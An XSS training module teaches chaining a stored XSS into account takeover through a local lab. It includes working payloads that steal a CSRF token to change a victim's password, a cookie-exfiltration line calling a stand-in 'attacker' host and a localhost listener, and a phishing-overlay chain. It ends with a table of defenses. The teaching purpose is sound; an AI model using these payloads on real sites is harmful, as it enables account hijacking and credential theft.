Module 15 — Attack Chaining: XSS → Full Account Takeover

XSS Mastery Course · Module 15 of 19

1. Why Chaining Matters

An isolated XSS alert is a proof-of-concept, not an impact statement. In real-world exploitation — bug bounty programs, red team engagements, actual breaches — the value of XSS comes from what you chain onto it. A single XSS vulnerability, combined with the right application context, can achieve:

  • Full account takeover (password change, session theft)
  • CSRF token exfiltration → any state-changing action as the victim
  • Credential phishing with a pixel-perfect overlay
  • Lateral movement to other authenticated users via stored XSS
  • Keylogging, screenshot capture, webcam access (with permissions)
  • Exfiltration of all page data, local storage, IndexedDB
PhD-level frame: XSS is not a vulnerability class — it is a code execution primitive in the browser context. What you do with code execution is limited only by what the application allows authenticated users to do.

2. The Four Core Chains

Chain A — Session Cookie Theft

STEP 1 XSS fires in victim's browser
↓ STEP 2 document.cookie read (if HttpOnly is NOT set)
↓ STEP 3 Cookie exfiltrated via OOB: new Image().src = 'https://attacker/c?c='+document.cookie
↓ STEP 4 Attacker replays cookie in their own browser → authenticated as victim

Blocked by: HttpOnly flag prevents JS reading the cookie. Bypass: XSS can still forge requests using the cookie (browser sends it automatically) even if it can't read it.

Chain B — CSRF Token Theft → Forced Action

STEP 1 XSS fires in victim's browser
↓ STEP 2 fetch('/settings') — reads the settings page (same-origin, no CORS block)
↓ STEP 3 Parse CSRF token from the HTML response
↓ STEP 4 fetch('/change-password', {method:'POST', body:'token=X&new=attacker123'})
↓ STEP 5 Password changed → account taken over

Why XSS bypasses CSRF protection: CSRF tokens protect against cross-origin requests. XSS runs same-origin — it can read and submit forms as if it were the user. The CSRF token is no obstacle once you have XSS.

Chain C — Credential Phishing Overlay

STEP 1 XSS fires in victim's browser
↓ STEP 2 Inject a pixel-perfect login overlay that looks like the site's real login form
↓ STEP 3 Victim types their password into the fake form
↓ STEP 4 Credentials exfiltrated to attacker server
↓ STEP 5 Overlay removes itself, real login proceeds — victim never knows

Effective because: The overlay is served from the legitimate domain. The URL bar shows the correct site. No phishing warning fires. Users have no reason to be suspicious.

Chain D — localStorage / IndexedDB Exfiltration

STEP 1 XSS fires in victim's browser
↓ STEP 2 JSON.stringify(localStorage) → exfiltrate all client-side storage
↓ STEP 3 Modern SPAs store JWTs, OAuth tokens, and app state in localStorage
↓ STEP 4 Attacker uses JWT directly to authenticate to the API

4. Lab Exercise: Full Account Takeover via Stored XSS

In this exercise you will execute a complete chain from a stored XSS entry point to a successful password change.

  1. Start the server: make py
  2. Register user alice at /auth/register — this is your victim account
  3. Register user attacker — this account will submit the malicious payload
  4. Log in as attacker and set your display_name to the XSS payload in Chain B below
  5. Log in as alice and visit /auth/profile/attacker — this renders the stored XSS
  6. Observe: alice's password has been changed to hacked123
  7. Confirm: log out, log back in as alice with password hacked123 — success

The Payload (Chain B)

<img src=x onerror="
  fetch('/auth/settings')
    .then(r => r.text())
    .then(html => {
      const m = html.match(/name=['\"]csrf['\"] value=['\"]([^'\"]+)/);
      const token = m ? m[1] : '';
      return fetch('/auth/change-password', {
        method: 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'csrf=' + token + '&new_password=hacked123&confirm=hacked123'
      });
    })
    .then(() => new Image().src = 'http://localhost:5001/oob?pwned=1')
">
Key insight: The payload is split across two async steps. First it reads the settings page to get a fresh CSRF token. Then it uses that token to submit a valid password-change request. The server accepts it because the request originates from the same origin.

5. Cookie Theft Payload

// Works only when HttpOnly is NOT set (lab deliberately omits it)
<img src=x onerror="
  new Image().src = 'http://localhost:5001/oob?c=' + encodeURIComponent(document.cookie)
">

In the lab server, session cookies intentionally lack HttpOnly. In real apps with HttpOnly set, you cannot read the cookie value — but you can still forge authenticated requests using the browser's automatic cookie attachment, as demonstrated in Chain B.

8. Defense Implications

DefenseStops which chain?What it doesn't stop
HttpOnly cookiesChain A (cookie read)Chains B, C, D — requests still carry the cookie automatically
CSRF tokensCross-origin CSRFXSS-assisted CSRF — same-origin XSS can read and use the token
SameSite=Strict cookiesCSRF from cross-origin navigationsXSS running same-origin — same-origin requests still carry cookie
Content Security PolicyBlocks inline scripts (Chain A, B, C, D payloads)Must be properly configured — unsafe-inline defeats it
Re-authentication for sensitive actionsChain B password changeDoesn't prevent cookie theft or data exfil
The hard truth: There is no defense that neutralises XSS post-exploitation chains except preventing XSS in the first place. Every other defense is damage limitation. The chains in this module all run on-origin with the victim's full permissions.
